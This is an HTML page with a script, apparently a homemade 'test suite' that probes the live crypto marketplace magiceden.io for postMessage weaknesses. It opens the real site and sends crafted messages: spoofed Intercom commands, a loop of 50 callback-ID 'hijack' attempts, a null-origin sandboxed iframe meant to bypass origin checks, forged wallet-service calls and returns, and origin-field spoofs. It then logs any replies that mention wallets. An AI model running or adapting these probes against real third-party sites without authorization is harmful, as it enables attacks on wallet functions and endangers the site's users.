<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>MagicEden Simple Tests</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 1200px;
            margin: 20px auto;
            padding: 20px;
            background: #f5f5f5;
        }
        
        h1 {
            color: #333;
            border-bottom: 3px solid #667eea;
            padding-bottom: 10px;
        }
        
        .test-box {
            background: white;
            padding: 20px;
            margin: 15px 0;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        
        .test-box h3 {
            color: #667eea;
            margin-top: 0;
        }
        
        button {
            background: #667eea;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin: 5px;
        }
        
        button:hover {
            background: #5568d3;
        }
        
        .status {
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            font-weight: bold;
        }
        
        .waiting { background: #fff3cd; color: #856404; }
        .testing { background: #d1ecf1; color: #0c5460; }
        .success { background: #d4edda; color: #155724; }
        .vulnerable { background: #f8d7da; color: #721c24; }
        
        #log {
            background: #1e1e1e;
            color: #0f0;
            padding: 15px;
            border-radius: 5px;
            font-family: monospace;
            font-size: 12px;
            height: 400px;
            overflow-y: auto;
            margin-top: 20px;
        }
        
        .msg-received {
            color: #4ade80;
            font-weight: bold;
        }
        
        .msg-sent {
            color: #60a5fa;
        }
        
        .msg-error {
            color: #f87171;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <h1>üîç MagicEden Simple Test Suite</h1>
    
    <div class="test-box">
        <h3>Test 1: Basic PostMessage to MagicEden</h3>
        <p>Opens MagicEden and sends basic messages</p>
        <button onclick="test1()">Run Test 1</button>
        <div id="status1" class="status waiting">Ready to test</div>
    </div>
    
    <div class="test-box">
        <h3>Test 2: Intercom Message Spoofing</h3>
        <p>Sends intercom-like messages we detected earlier</p>
        <button onclick="test2()">Run Test 2</button>
        <div id="status2" class="status waiting">Ready to test</div>
    </div>
    
    <div class="test-box">
        <h3>Test 3: Callback ID Bruteforce</h3>
        <p>Tries different callback IDs from the code</p>
        <button onclick="test3()">Run Test 3</button>
        <div id="status3" class="status waiting">Ready to test</div>
    </div>
    
    <div class="test-box">
        <h3>Test 4: Null Origin Attack</h3>
        <p>Creates null origin iframe to bypass checks</p>
        <button onclick="test4()">Run Test 4</button>
        <div id="status4" class="status waiting">Ready to test</div>
    </div>
    
    <div class="test-box">
        <h3>Test 5: WAAS Commands</h3>
        <p>Sends wallet-related commands</p>
        <button onclick="test5()">Run Test 5</button>
        <div id="status5" class="status waiting">Ready to test</div>
    </div>
    
    <div class="test-box">
        <h3>Test 6: Origin Field Spoofing</h3>
        <p>Tests origin validation bypass</p>
        <button onclick="test6()">Run Test 6</button>
        <div id="status6" class="status waiting">Ready to test</div>
    </div>
    
    <div id="log"></div>
    <button onclick="clearLog()" style="background: #dc3545;">Clear Log</button>
    
    <script>
        const TARGET = 'https://magiceden.io';
        const WAIT_TIME = 15000; // 15 seconds
        let testWindow = null;
        let messageCount = 0;
        
        // Simple logging
        function log(msg, type = 'info') {
            const logDiv = document.getElementById('log');
            const time = new Date().toLocaleTimeString();
            let className = 'msg-sent';
            
            if (type === 'received') className = 'msg-received';
            if (type === 'error') className = 'msg-error';
            
            logDiv.innerHTML += `<div class="${className}">[${time}] ${msg}</div>`;
            logDiv.scrollTop = logDiv.scrollHeight;
            console.log(msg);
        }
        
        function clearLog() {
            document.getElementById('log').innerHTML = '';
            messageCount = 0;
        }
        
        function setStatus(testNum, status, text) {
            const el = document.getElementById('status' + testNum);
            el.className = 'status ' + status;
            el.textContent = text;
        }
        
        // Listen for ALL messages
        window.addEventListener('message', function(e) {
            messageCount++;
            log('üì® RECEIVED #' + messageCount + ' from: ' + e.origin, 'received');
            log('   Data: ' + JSON.stringify(e.data), 'received');
            
            // Check for interesting patterns
            const dataStr = JSON.stringify(e.data);
            if (dataStr.includes('error') || dataStr.includes('Error')) {
                log('   ‚ö†Ô∏è ERROR DETECTED!', 'error');
            }
            if (dataStr.includes('wallet') || dataStr.includes('waas')) {
                log('   üéØ WALLET RELATED!', 'error');
            }
        });
        
        // Test 1: Basic Messages
        function test1() {
            log('=== TEST 1 STARTED ===');
            setStatus(1, 'testing', 'Opening MagicEden...');
            
            testWindow = window.open(TARGET, 'test1');
            
            setTimeout(function() {
                log('Sending basic messages...');
                
                testWindow.postMessage({test: 'hello'}, '*');
                testWindow.postMessage({id: '1', data: 'test'}, '*');
                testWindow.postMessage('simple-string', '*');
                
                log('‚úÖ Test 1 complete');
                setStatus(1, 'success', '‚úÖ Complete - Check log');
            }, WAIT_TIME);
        }
        
        // Test 2: Intercom Spoofing
        function test2() {
            log('=== TEST 2 STARTED ===');
            setStatus(2, 'testing', 'Testing Intercom...');
            
            testWindow = window.open(TARGET, 'test2');
            
            setTimeout(function() {
                log('Sending Intercom messages...');
                
                testWindow.postMessage({type: 'intercom-snippet__ready'}, '*');
                testWindow.postMessage({type: 'intercom-command', command: 'test'}, '*');
                
                log('‚úÖ Test 2 complete');
                setStatus(2, 'success', '‚úÖ Complete - Check log');
            }, WAIT_TIME);
        }
        
        // Test 3: Callback IDs
        function test3() {
            log('=== TEST 3 STARTED ===');
            setStatus(3, 'testing', 'Bruteforcing IDs...');
            
            testWindow = window.open(TARGET, 'test3');
            
            setTimeout(function() {
                log('Sending 50 callback attempts...');
                
                for (let i = 0; i < 50; i++) {
                    testWindow.postMessage({
                        id: i.toString(),
                        data: 'hijack-' + i,
                        returnValue: 'test'
                    }, '*');
                }
                
                log('‚úÖ Test 3 complete');
                setStatus(3, 'success', '‚úÖ Complete - Check log');
            }, WAIT_TIME);
        }
        
        // Test 4: Null Origin
        function test4() {
            log('=== TEST 4 STARTED ===');
            setStatus(4, 'testing', 'Creating null origin...');
            
            const iframe = document.createElement('iframe');
            iframe.sandbox = 'allow-scripts allow-popups';
            iframe.style.display = 'none';
            
            const scriptContent = 
                'var w = window.open("' + TARGET + '", "test4");' +
                'setTimeout(function() {' +
                '  w.postMessage({nullOrigin: true, test: "bypass"}, "*");' +
                '  w.postMessage({id: "null-1", data: "attack"}, "*");' +
                '}, ' + WAIT_TIME + ');';
            
            iframe.srcdoc = '<script>' + scriptContent + '<\/script>';
            document.body.appendChild(iframe);
            
            log('Null origin iframe created');
            
            setTimeout(function() {
                log('‚úÖ Test 4 complete');
                setStatus(4, 'success', '‚úÖ Complete - Check log');
            }, WAIT_TIME + 2000);
        }
        
        // Test 5: WAAS Commands
        function test5() {
            log('=== TEST 5 STARTED ===');
            setStatus(5, 'testing', 'Testing WAAS...');
            
            testWindow = window.open(TARGET, 'test5');
            
            setTimeout(function() {
                log('Sending WAAS commands...');
                
                testWindow.postMessage({
                    waasCall: {
                        command: 'test',
                        parameter: 'value',
                        callId: '123'
                    }
                }, '*');
                
                testWindow.postMessage({
                    waasReturn: {
                        returnValue: 'hijacked',
                        success: true,
                        callId: '1'
                    }
                }, '*');
                
                log('‚úÖ Test 5 complete');
                setStatus(5, 'success', '‚úÖ Complete - Check log');
            }, WAIT_TIME);
        }
        
        // Test 6: Origin Spoofing
        function test6() {
            log('=== TEST 6 STARTED ===');
            setStatus(6, 'testing', 'Testing origin...');
            
            testWindow = window.open(TARGET, 'test6');
            
            setTimeout(function() {
                log('Sending origin spoofs...');
                
                testWindow.postMessage({origin: 'host', data: 'test'}, '*');
                testWindow.postMessage({origin: TARGET, data: 'spoof'}, '*');
                testWindow.postMessage({origin: null, data: 'null'}, '*');
                testWindow.postMessage({origin: '', data: 'empty'}, '*');
                
                log('‚úÖ Test 6 complete');
                setStatus(6, 'success', '‚úÖ Complete - Check log');
            }, WAIT_TIME);
        }
        
        // Init
        log('üéØ Test Suite Ready');
        log('Click any test button to start');
        log('Messages will appear here in GREEN');
    </script>
</body>
</html>
